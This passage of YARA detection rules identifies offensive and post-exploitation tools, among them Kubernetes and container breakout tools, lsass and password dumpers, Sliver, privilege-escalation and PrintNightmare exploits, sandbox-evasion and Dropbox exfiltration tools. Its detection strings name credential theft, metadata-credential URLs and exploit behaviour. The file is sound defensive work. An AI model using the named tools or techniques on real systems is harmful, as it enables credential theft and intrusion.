        $s3 = "{{join .Names \", \"}}{{\"\\t\"}}{{.Usage}}{{end}}{{end}}{{end}}{{end}}{{" ascii
        $s4 = "</table></thead></tbody>" fullword ascii
        $s5 = "value=aacute;abreve;addressagrave;alt -> andand;angmsd;angsph;any -> apacir;approx;articleatilde;barvee;barwed;bdoUxXvbecaus;ber" ascii
        $s6 = "/dev/urandom127.0.0.1:" ascii
        $s7 = "non-IPv4 addressnon-IPv6 addressntrianglelefteq;object is remotepacer: H_m_prev=reflect mismatchregexp: Compile(remote I/O error" ascii
        $s8 = ".WithDeadline(.in-addr.arpa." ascii
    condition:
        (uint16(0) == 0x5a4d or uint16(0) == 0x457f) and 6 of them
}

rule INDICATOR_TOOL_PET_Peirates {
    meta:
        author = "ditekSHen"
        description = "Detects Kubernetes penetration tool Peirates"
    strings:
        $s1 = "DeprecatedServiceAccount" fullword ascii
        $s2 = "LivenessProbe" fullword ascii
        $s3 = "\\t\\tkubectl expose rs nginx --port=80 --target-port=8000" ascii
        $s4 = "\\t\\tkubectl run hazelcast --image=hazelcast --port=5701" ascii
        $s5 = "COMPREPLY[$i]=${COMPREPLY[$i]#\"$colon_word\"}" ascii
        $s6 = "%*polymorphichelpers.HistoryViewerFunc" ascii
        $s7 = "ListenAndServeTLS" ascii
        $s8 = "DownwardAPI" ascii
        $s9 = "; plural=(n%10==1 && n%100!=11 ? 0 : n != 0 ? 1 : 2);proto:" ascii
        $s10 = "name: attack-" ascii
    condition:
       uint16(0) == 0x457f and 9 of them
}

rule INDICATOR_TOOL_PET_BOtB {
    meta:
        author = "ditekSHen"
        description = "Detects Break out the Box (BOtB)"
    strings:
        $s1 = "to unallocated span%%!%c(*big.Float=%s), RecursionDesired: /usr/share/zoneinfo//{Bucket}/{Key+}?acl/{Bucket}?accelerate/{Bucket}?encryption/{Bucket}?" ascii
        $s2 = "exploit CVE-2019-5736 with command: [ERROR] In Enabling CGROUP Notifications -> 'echo 1 > [INFO] CGROUP may exist, attempting exploit regardless" ascii
        $s3 = "main.execShellCmd" ascii
        $s4 = "[*] Data uploaded to:[+]" ascii
        $s5 = "whitespace or line breakfailed to find credentials in the environment.failed to get %s EC2 instance role credentialsfirst" ascii
        $s6 = "This process will exit IF an EXECVE is called in the Container or if the Container is manually stoppedPerform reverse DNS lookups" ascii
        $s7 = "http: request too largehttp://100.100.100.200/http://169.254.169.254/index out of range" ascii
    condition:
       uint16(0) == 0x457f and 6 of them
}

rule INDICATOR_TOOL_PWS_LSASS_CreateMiniDump {
    meta:
        author = "ditekSHen"
        description = "Detects CreateMiniDump tool"
    strings:
        $s1 = "lsass.dmp" fullword wide
        $s2 = "lsass dumped successfully!" ascii
        $s3 = "Got lsass.exe PID:" ascii
        $s4 = "\\experiments\\CreateMiniDump\\CreateMiniDump\\" ascii
        $s5 = "MiniDumpWriteDump" fullword ascii
    condition:
        uint16(0) == 0x5a4d and 2 of them
}

rule INDICATOR_TOOL_PWS_SecurityXploded_BrowserPasswordDumper {
    meta:
        author = "ditekSHen"
        description = "Detects SecurityXploded Browser Password Dumper tool"
    strings:
        $s1 = "\\projects\\windows\\BrowserPasswordDump\\Release\\FireMaster.pdb" ascii
        $s2 = "%s: Dumping passwords" fullword ascii
        $s3 = "%s - Found login data file...dumping the passwords from file %s" fullword ascii
        $s4 = "%s Dumping secrets from login json file %s" fullword ascii
    condition:
        uint16(0) == 0x5a4d and 3 of them
}

rule INDICATOR_TOOL_PWS_SecurityXploded_FTPPasswordDumper {
    meta:
        author = "ditekSHen"
        description = "Detects SecurityXploded FTP Password Dumper tool"
    strings:
        $s1 = "\\projects\\windows\\FTPPasswordDump\\Release\\FireMaster.pdb" ascii
        $s2 = "//Dump all the FTP passwords to a file \"c:\\passlist.txt\"" ascii
        $s3 = "//Dump all the FTP passwords to console" ascii
        $s4 = "FTP Password Dump" fullword wide
    condition:
        uint16(0) == 0x5a4d and 3 of them
}

rule INDICATOR_TOOL_PWS_SecurityXploded_EmailPasswordDumper {
    meta:
        author = "ditekSHen"
        description = "Detects SecurityXploded Email Password Dumper tool"
    strings:
        $s1 = "\\projects\\windows\\EmailPasswordDump\\Release\\FireMaster.pdb" ascii
        $s2 = "//Dump all the Email passwords to a file \"c:\\passlist.txt\"" ascii
        $s3 = "EmailPasswordDump" fullword wide
        $s4 = "//Dump all the Email passwords to console" ascii
        $s5 = "Email Password Dump" fullword wide
    condition:
        uint16(0) == 0x5a4d and 3 of them
}

rule INDICATOR_TOOL_PET_SharpSphere {
    meta:
        author = "ditekSHen"
        description = "Detects SharpSphere red teamers tool to interact with the guest operating systems of virtual machines managed by vCenter"
    strings:
        $s1 = "get_virtualExecUsage" fullword ascii
        $s2 = "Command to execute" fullword ascii
        $s3 = "<guestusername>k__" ascii
        $s4 = ".VirtualMachineDeviceRuntimeInfoVirtualEthernetCardRuntimeState" ascii
        $s5 = "datastoreUrl" ascii
        $s6 = "SharpSphere.vSphere." ascii
        $s7 = "HelpText+vCenter SDK URL, i.e. https://127.0.0.1/sdk" ascii
        $s8 = "[x] Execution finished, attempting to retrieve the results" fullword wide
        $s9 = "C:\\Windows\\System32\\cmd.exe" fullword wide
        $s10 = "C:\\Users\\Public\\" fullword wide
    condition:
        uint16(0) == 0x5a4d and 4 of them
}

rule INDICATOR_TOOL_ExchangeExploit {
     meta:
        author = "ditekSHen"
        description = "Hunt for executables potentially embedding Exchange Server exploitation artificats"
    strings:
        $s1 = "ecp/default.flt?" ascii wide nocase
        $s2 = "owa/auth/logon.aspx?" ascii wide nocase
        $s3 = "X-AnonResource-Backend" ascii wide
        $s4 = "EWS/Exchange.asmx?" ascii wide nocase
        $s5 = "X-BEResource" ascii wide
        $s6 = "https://%s/owa/auth/" ascii wide
    condition:
        (uint16(0) == 0x5a4d or uint16(0) == 0x457f) and 5 of them
}

rule INDICATOR_TOOL_GoCLR {
     meta:
        author = "ditekSHen"
        description = "Detects binaries utilizing Go-CLR for hosting the CLR in a Go process and using it to execute a DLL from disk or an assembly from memory"
    strings:
        $s1 = "github.com/ropnop/go-clr.(*IC" ascii
        $s2 = "EnumKeyExWRegEnumValueWRegOpenKeyExWRtlCopyMemoryRtlGetVersionShellExecuteWStartServiceW" ascii
        $c1 = "ICorRuntimeHost" ascii wide
        $c2 = "CLRCreateInstance" ascii wide
        $c3 = "ICLRRuntimeInfo" ascii wide
        $c4 = "ICLRMetaHost" ascii wide
        $go = "Go build ID:" ascii wide
    condition:
        uint16(0) == 0x5a4d and all of ($s*) or (2 of ($c*) and $go)
}

rule INDICATOR_TOOL_EdgeCookiesView {
     meta:
        author = "ditekSHen"
        description = "Detects EdgeCookiesView"
    strings:
        $s1 = "AddRemarkCookiesTXT" fullword wide
        $s2 = "# Netscape HTTP Cookie File" fullword wide
        $s3 = "/scookiestxt" fullword wide
        $s4 = "/deleteregkey" fullword wide
        $s5 = "Load cookies from:" wide
        $s6 = "Old cookies folder of Edge/IE" wide
        $pdb = "\\EdgeCookiesView\\Release\\EdgeCookiesView.pdb" ascii
    condition:
        uint16(0) == 0x5a4d and (5 of ($s*) or (($pdb) and 2 of ($s*)))
}

rule INDICATOR_TOOL_SharpNoPSExec {
     meta:
        author = "ditekSHen"
        description = "Detects SharpNoPSExec"
    strings:
        $s1 = "|-> Service" wide
        $s2 = "authenticated as" wide
        $s3 = "ImpersonateLoggedOnUser failed. Error:{0}" wide
        $s4 = "uPayload" fullword ascii
        $s5 = "pcbBytesNeeded" fullword ascii
        $s6 = "SharpNoPSExec" ascii wide
        $pdb1 = "SharpNoPSExec\\obj\\Debug\\SharpNoPSExec.pdb" ascii
        $pdb2 = "SharpNoPSExec\\obj\\Release\\SharpNoPSExec.pdb" ascii
    condition:
        uint16(0) == 0x5a4d and (4 of ($s*) or (1 of ($pdb*) and 1 of ($s*)))
}

rule INDICATOR_TOOL_ChromeCookiesView {
     meta:
        author = "ditekSHen"
        description = "Detects ChromeCookiesView"
    strings:
        $s1 = "AddRemarkCookiesTXT" fullword wide
        $s2 = "Decrypt cookies" wide
        $s3 = "/scookiestxt" fullword wide
        $s4 = "/deleteregkey" fullword wide
        $s5 = "Cookies.txt Format" wide
        $s6 = "# Netscape HTTP Cookie File" wide
        $pdb = "\\ChromeCookiesView\\Release\\ChromeCookiesView.pdb" ascii
    condition:
        uint16(0) == 0x5a4d and (5 of ($s*) or (($pdb) and 2 of ($s*)))
}

rule INDICATOR_TOOL_Sliver {
     meta:
        author = "ditekSHen"
        description = "Detects Sliver implant cross-platform adversary emulation/red team"
    strings:
        $x1 = "github.com/bishopfox/sliver/protobuf/sliverpbb." ascii
        $s1 = ".commonpb.ResponseR" ascii
        $s2 = ".PortfwdProtocol" ascii
        $s3 = ".WGTCPForwarder" ascii
        $s4 = ".WGSocksServerR" ascii
        $s5 = ".PivotEntryR" ascii
        $s6 = ".BackdoorReq" ascii
        $s7 = ".ProcessDumpReq" ascii
        $s8 = ".InvokeSpawnDllReq" ascii
        $s9 = ".SpawnDll" ascii
        $s10 = ".TCPPivotReq" ascii
    condition:
        (uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xfacf) and (1 of ($x*) or 5 of ($s*))
}

rule INDICATOR_TOOL_OwlProxy {
     meta:
        author = "ditekSHen"
        description = "Hunt for OwlProxy"
    strings:
        $is1 = "call_new command: " wide
        $is2 = "call_proxy cmd: " wide
        $is3 = "download_file: " wide
        $is4 = "cmdhttp_run" wide
        $is5 = "sub_proxyhttp_run" wide
        $is6 = "proxyhttp_run" wide
        $is7 = "webshell_run" wide
        $is8 = "/exchangetopicservices/" fullword wide
        $is9 = "c:\\windows\\system32\\wmipd.dll" fullword wide
        $iu1 = "%s://+:%d%s" wide
        $iu2 = "%s://+:%d%spp/" wide
        $iu3 = "%s://+:%d%spx/" wide
    condition:
        uint16(0) == 0x5a4d and 6 of ($is*) or (all of ($iu*) and 2 of ($is*))
}

rule INDICATOR_TOOL_Backstab {
     meta:
        author = "ditekSHen"
        description = "Detect Backstab tool capable of killing antimalware protected processes by leveraging sysinternals Process Explorer (ProcExp) driver"
    strings:
        $s1 = "NtLoadDriver: %x" fullword ascii
        $s2 = "POSIXLY_CORRECT" fullword ascii
        $s3 = "\\\\.\\PROCEXP" ascii
        $s4 = "ProcExpOpenProtectedProcess.DeviceIoControl: %" ascii
        $s5 = "ProcExpKillHandle.DeviceIoControl" ascii
        $s6 = "[%#llu] [%ws]: %ws" fullword ascii
        $s7 = "D:P(A;;GA;;;SY)(A;;GRGWGX;;;BA)(A;;GR" wide
    condition:
        uint16(0) == 0x5a4d and 6 of them
}

rule INDICATOR_TOOL_EXP_SharpPrintNightmare {
     meta:
        author = "ditekSHen"
        description = "Detect SharpPrintNightmare"
    strings:
        $s1 = "RevertToSelf() Error:" wide
        $s2 = "NeverGonnaGiveYou" wide
        $s3 = "\\Amd64\\UNIDRV.DLL" wide
        $s4 = ":\\Windows\\System32\\DriverStore\\FileRepository\\" wide
        $s5 = "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{0}\\{1}" wide
        $s6 = "\\SharpPrintNightmare\\" ascii
        $s7 = { 4e 61 6d 65 09 46 75 6c 6c 54 72 75 73 74 01 }
        $s8 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\PackageInstallation\\Windows x64\\DriverPackages" wide
        $s9 = "ntprint.inf_amd64" wide
        $s10 = "AddPrinterDriverEx" wide
        $s11 = "addPrinter" ascii
        $s12 = "DRIVER_INFO_2" ascii
        $s13 = "APD_COPY_" ascii
    condition:
        uint16(0) == 0x5a4d and 7 of them
}

rule INDICATOR_TOOL_REC_ADFind {
     meta:
        author = "ditekSHen"
        description = "Detect ADFind"
    strings:
        $s1 = "\\AdFind\\AdFind\\AdFind.h" ascii
        $s2 = "\\AdFind\\AdFind\\AdFind.cpp" ascii
        $s3 = "\\AdFind\\Release\\AdFind.pdb" ascii
        $s4 = "joeware_default_adfind.cf" ascii
    condition:
        uint16(0) == 0x5a4d and 2 of them
}

rule INDICATOR_TOOL_CNC_Chisel {
     meta:
        author = "ditekSHen"
        description = "Detect binaries using Chisel"
    strings:
        $s1 = "chisel-v" ascii
        $s2 = "sendchisel-v" ascii
        $s3 = "<-chiselclosedcookiedomainefenceempty" ascii
        $ws1 = "Sec-WebSocket-Key" ascii
        $ws2 = "Sec-WebSocket-Protocol" ascii
        $ws3 = "Sec-Websocket-Version" ascii
        $ws4 = "Sec-Websocket-Extensions" ascii
    condition:
        uint16(0) == 0x5a4d and (1 of ($s*) and 3 of ($ws*))
}

rule INDICATOR_TOOL_ANT_SharpEDRChecker {
    meta:
        author = "ditekSHen"
        description = "Detect SharpEDRChecke, C# Implementation of Invoke-EDRChecker"
    strings:
        $pdb1 = "\\SharpEDRChecker.pdb" fullword ascii
        $x1 = "EDRData" fullword ascii
        $x2 = "bytesNeeded" fullword ascii
        $x3 = /\] Checking (Directories|drivers|processes|modules|Registry|Services) \[/ wide
        $s1 = "CheckService" fullword ascii
        $s2 = "CheckModule" fullword ascii
        $s3 = "PrivCheck" fullword ascii
        $s4 = "ServiceChecker" fullword ascii
        $s5 = "PrivilegeChecker" fullword ascii
        $s6 = "FileChecker" fullword ascii
        $s7 = "DriverChecker" fullword ascii
        $s8 = "ProcessChecker" fullword ascii
        $s9 = "DirectoryChecker" fullword ascii
        $s10 = "RegistryChecker" fullword ascii
        $s11 = "CheckDriver" fullword ascii
        $s12 = "CheckServices" fullword ascii
        $s13 = "CheckDirectories" fullword ascii
        $s14 = "CheckCurrentProcessModules" fullword ascii
        $s15 = "CheckProcesses" fullword ascii
        $s16 = "CheckDrivers" fullword ascii
        $s17 = "CheckProcess" fullword ascii
        $s18 = "CheckSubDirectory" fullword ascii
        $s19 = "CheckDirectory" fullword ascii
        $s20 = "CheckRegistry" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (all of ($x*) or 10 of ($s*) or (1 of ($pdb*) and (1 of ($x*) or 2 of ($s*))) or (#x3 > 4 and 2 of them))
}

rule INDICATOR_TOOL_ANT_InviZzzible {
    meta:
        author = "ditekSHen"
        description = "Detect InviZzzible"
    strings:
        $s1 = "\\\\.\\pipe\\task_sched_se" fullword wide
        $s2 = "\\\\\\.\\NPF_NdisWanIp" fullword wide
        $s3 = /--action --(dtt|mra|user-input|cfg|dan|evt|pid|exc|wmi|tsh)/ fullword wide
        $s4 = "cuckoo_%lu.ini" fullword wide
        $s5 = "sandbox evasion" wide nocase
        $s6 = "UnbalancedStack" fullword ascii
        $s7 = "process_with_long_name" fullword ascii
        $s8 = "DelaysAccumulation" fullword ascii
        $s9 = "PidReuse" fullword ascii
        $s10 = "DeadAnalyzer" fullword ascii
        $s11 = "SleepDummyPatch" fullword ascii
        $s12 = "AudioDeviceAbsence" fullword ascii
        $s14 = "\\\\.\\PhysicalDrive%u" fullword ascii
        $s15 = "\"countermeasures\":" ascii
        $s16 = "_%.02u%.02u%.02u_%.02u%.02u%.02u.html" ascii
        $f1 = ".?AVHyperV@SandboxEvasion@@" ascii
        $f2 = ".?AVJoebox@SandboxEvasion@@" ascii
        $f3 = ".?AVKVM@SandboxEvasion@@" ascii
        $f4 = ".?AVMisc@SandboxEvasion@@" ascii
        $f5 = ".?AVParallels@SandboxEvasion@@" ascii
        $f6 = ".?AVQEMU@SandboxEvasion@@" ascii
        $f7 = ".?AVSandboxie@SandboxEvasion@@" ascii
        $f8 = ".?AVVBOX@SandboxEvasion@@" ascii
        $f9 = ".?AVVirtualPC@SandboxEvasion@@" ascii
        $f10 = ".?AVVMWare@SandboxEvasion@@" ascii
        $f11 = ".?AVWine@SandboxEvasion@@" ascii
        $f12 = ".?AVXen@SandboxEvasion@@" ascii
    condition:
        uint16(0) == 0x5a4d and (6 of ($s*) or 4 of ($f*) or (2 of ($f*) and 2 of ($s*)))
}

rule INDICATOR_TOOL_EXFIL_SharpBox {
    meta:
        author = "ditekSHen"
        description = "Detect SharpBox, C# tool for compressing, encrypting, and exfiltrating data to Dropbox using the Dropbox API"
    strings:
        $s1 = "UploadData" fullword ascii
        $s2 = "isAttached" fullword ascii
        $s3 = "DecryptFile" fullword ascii
        $s4 = "set_dbxPath" fullword ascii
        $s5 = "set_dbxToken" fullword ascii
        $s6 = "set_decrypt" fullword ascii
        $s7 = "GeneratePass" fullword ascii
        $s8 = "FileUploadToDropbox" fullword ascii
        $s9 = "\\SharpBox.pdb" ascii
        $s10 = "https://content.dropboxapi.com/2/files/upload" fullword wide
        $s12 = "Dropbox-API-Arg: {\"path\":" wide
        $s13 = "X509Certificate [{0}] Policy Error: '{1}'" fullword wide
    condition:
        uint16(0) == 0x5a4d and 7 of them
}

rule INDICATOR_TOOL_EXP_SeriousSAM01 {
    meta:
        author = "ditekSHen"
        description = "Detect tool variants potentially exploiting SeriousSAM / HiveNightmare CVE-2021-36934"
    strings:
        $s1 = "VolumeShadowCopy" fullword wide
        $s2 = "\\\\?\\GLOBALROOT\\Device\\" fullword wide
        $s3 = "{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}" fullword wide
        $s4 = "ASPNET_WP_PASSWORD" fullword wide
        $s5 = "<ParseSam>b__" ascii
        $s6 = "<DumpSecret" ascii
        $s7 = "<ParseSecret" ascii
        $s8 = "LsaSecretBlob" fullword ascii
        $s9 = "systemHive" fullword ascii
        $s10 = "ImportHiveDump" fullword ascii
        $s11 = "FindShadowVolumes" fullword ascii
        $s12 = "GetBootKey" fullword ascii
        $r1 = "[*] SAM" wide
        $r2 = "[*] SYSTEM" wide
        $r3 = "[*] SECURITY" wide
    condition:
        uint16(0) == 0x5a4d and (6 of ($s*) or (all of ($r*) and 3 of ($s*)))
}

rule INDICATOR_TOOL_EXP_SeriousSAM02 {
    meta:
        author = "ditekSHen"
        description = "Detect tool variants potentially exploiting SeriousSAM / HiveNightmare CVE-2021-36934"
    strings:
        $s1 = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" fullword wide
        $s2 = /(Windows\\System32\\config)?\\(SAM|SECURITY|SYSTEM)/ ascii wide
        $s3 = /(SAM|SECURITY|SYSTEM)-%s/ fullword wide
        $s4 = /: (SAM|SECURITY|SYSTEM) hive from/ wide
        $v1 = "VolumeShadowCopy" ascii wide
        $v2 = "GLOBALROOT" ascii wide
        $v3 = "Device" ascii wide
        $n1 = "Block Level Backup Engine Service EXE" ascii wide
        $n2 = "|TaskID=%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X" wide
        $n3 = "[traceprovider-trace] Failed: %ws: %#010x" wide
        $n4 = "base\\stor\\blb\\engine\\usn\\base\\lib\\usnjournalhelper.cpp" wide
    condition:
        uint16(0) == 0x5a4d and not any of ($n*) and (all of ($s*) or (all of ($v*) and 2 of ($s*)) or (all of ($v*) and #s2 > 2))
}

rule INDICATOR_TOOL_EXP_PetitPotam01 {
    meta:
        author = "ditekSHen"
        description = "Detect tool potentially exploiting/attempting PetitPotam"
    strings:
        $s1 = "\\pipe\\lsarpc" fullword wide
        $s2 = "\\%s" fullword wide
        $s3 = "ncacn_np" fullword wide
        $s4 = /EfsRpc(OpenFileRaw|EncryptFileSrv|DecryptFileSrv|QueryUsersOnFile|QueryRecoveryAgents|RemoveUsersFromFile|AddUsersToFile)/ wide
        $r1 = "RpcBindingFromStringBindingW" fullword ascii
        $r2 = "RpcStringBindingComposeW" fullword ascii
        $r3 = "RpcStringFreeW" fullword ascii
        $r4 = "RPCRT4.dll" fullword ascii
        $r5 = "NdrClientCall2" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (all of ($s*) and 4 of ($r*))
}

rule INDICATOR_TOOL_PET_SharpStrike {
    meta:
        author = "ditekSHen"
        description = "Detect SharpStrike post-exploitation tool written in C# that uses either CIM or WMI to query remote systems"
    strings:
        $x1 = "SharpStrike v" wide
        $x2 = "[*] Agent is busy" wide
        $x3 = "SharpStrike_Fody" fullword ascii
        $s1 = "ServiceLayer.CIM" fullword ascii
        $s2 = "Models.CIM" fullword ascii
        $s3 = "<HandleCommand>b__" ascii
        $s4 = "MemoryStream" fullword ascii
        $s5 = "GetCommands" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (2 of ($x*) or all of ($s*))
}

rule INDICATOR_TOOL_LTM_Ladon {
    meta:
        author = "ditekSHen"
        description = "Detect Ladon tool that assists in lateral movement across a network"
    strings:
        $d1 = "Ladon.VncSharp.dll" fullword ascii
        $d2 = "Ladon.Renci.SshNet.dll" fullword ascii
        $s1 = "Ladon." ascii
        $s2 = "nowPos" fullword ascii
        $s3 = "Scan" fullword ascii
        $s4 = "QLZ_STREAMING_BUFFER" fullword ascii
        $s5 = "sizeDecompressed" fullword ascii
        $s6 = "UpdateByte" fullword ascii
        $s7 = "kNumBitPriceShiftBits" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (all of ($d*) or all of ($s*) or (1 of ($d*) and 5 of ($s*)))
}

rule INDICATOR_TOOL_LTM_LadonExp {
    meta:
        author = "ditekSHen"
        description = "Detect Ladon tool that assists in lateral movement across a network"
    strings:
        $s1 = "txt_cscandll.Text" fullword wide
        $s2 = "CscanWebExpBuild.frmMain.resources" fullword ascii
        $s3 = "= \"$HttpXforwardedFor$\";" ascii
        $s4 = "namespace netscan" fullword ascii
    condition:
        uint16(0) == 0x5a4d and 3 of them
}

rule INDICATOR_TOOL_LTM_LadonGo {
    meta:
        author = "ditekSHen"
        description = "Detect LadonGo tool that assists in lateral movement across a network"
    strings:
        $f1 = "main.VulDetection" fullword ascii
        $f2 = "main.BruteFor" fullword ascii
        $f3 = "main.RemoteExec" fullword ascii
        $f4 = "main.Exploit" fullword ascii
        $f5 = "main.Noping" fullword ascii
        $f6 = "main.LadonScan" fullword ascii
        $f7 = "main.LadonUrlScan" fullword ascii
    condition:
        (uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xface) and 5 of ($f*)
}

rule INDICATOR_TOOL_ENC_DiskCryptor {
    meta:
        author = "ditekSHen"
        description = "Detect DiskCryptor open encryption solution that offers encryption of all disk partitions"
    strings:
        // Executable
        $x1 = "\\DiskCryptor\\DCrypt\\" ascii
        $s1 = "Error getting %sbootloader configuration" fullword wide
        $s2 = "loader.iso" fullword wide
        $s3 = "Bootloader config for [%s]" fullword wide
        $s4 = "dc_get_mbr_config" fullword ascii
        $s5 = "dc_encrypt_iso_image" fullword ascii
        $s6 = "dc_start_re_encrypt" fullword ascii
        $s7 = "dc_start_encrypt" fullword ascii
        $s8 = "_w10_reflect_" ascii
        // Driver
        $d1 = "\\DosDevices\\dcrypt" fullword wide
        $d2 = "$dcsys$_fail_%x" fullword wide
        $d3 = "%s\\$DC_TRIM_%x$" fullword wide
        $d4 = "\\Device\\dcrypt" fullword wide
        $d5 = "%s\\$dcsys$" fullword wide
    condition:
        uint16(0) == 0x5a4d and ((1 of ($x*) and 2 of ($s*)) or 4 of ($s*) or 3 of ($d*))
}

rule INDICATOR_TOOL_PRI_InstallerFileTakeOver {
    meta:
        author = "ditekSHen"
        description = "Detect InstallerFileTakeOver CVE-2021-41379"
    strings:
        $s1 = "splwow64.exe" fullword ascii
        $s2 = "notepad.exe" fullword ascii
        $s3 = "%s\\System32\\cmd.exe" fullword wide
        $s4 = "[SystemFolder]msiexec.exe" fullword wide
        $s5 = "microsoft plz" ascii
        $s6 = "%TEMP%\\" fullword wide
        $x1 = "\\InstallerFileTakeOver.pdb" ascii
        $o1 = { 48 b8 fe ff ff ff ff ff ff 7f 48 8b f5 48 83 ce }
        $o2 = { 4c 8d 62 10 48 c7 c7 ff ff ff ff 48 8b c7 66 0f }
        $o3 = { ff 15 9a 59 00 00 48 8b d8 e8 ba ff ff ff 45 33 }
        $o4 = { 49 c7 43 a8 fe ff ff ff 49 89 5b 10 48 8b 05 5a }
        $o5 = { 66 89 7c 24 50 48 c7 c2 ff ff ff ff 48 ff c2 66 }
    condition:
        uint16(0) == 0x5a4d and ((1 of ($x*) and (2 of ($s*) or 3 of ($o*))) or 4 of ($s*) or (all of ($o*) and 2 of them))
}

rule INDICATOR_TOOL_PRI_JuicyPotato {
    meta:
        author = "ditekSHen"
        description = "Detects JuicyPotato"
    strings:
        $x1 = "\\JuicyPotato.pdb" ascii
        $x2 = "JuicyPotato v%s" fullword ascii
        $s1 = "hello.stg" fullword wide
        $s2 = "ppVirtualProcessorRoots" fullword ascii
        $s3 = "Lock already taken" fullword ascii
        $s4 = "[+] authresult %d" fullword ascii
        $s5 = "RPC -> send failed with error: %d" fullword ascii
        $s6 = "Priv Adjust FALSE" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (all of ($x*) or (1 of ($x*) and 3 of ($s*)) or (5 of ($s*)))
}
